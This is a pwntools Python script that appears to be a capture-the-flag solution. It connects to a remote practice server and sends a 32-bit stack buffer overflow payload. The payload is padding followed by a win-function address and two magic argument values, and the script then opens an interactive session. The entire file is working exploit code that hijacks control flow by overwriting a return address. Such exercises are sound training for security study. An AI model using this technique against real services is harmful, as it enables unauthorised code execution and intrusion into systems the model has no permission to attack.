from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',26279)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive


win=0x080485CB

ru(b'Please enter your string:')

payload1=b'a'*(0x6c+4)+p32(win)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)
#payload1=b'a'*(0x6c+4)+p32(win)+b'\xDE\xAD\xBE\xEF'+b'\xDE\xAD\xC0\xDE'
sl(payload1)




ii()
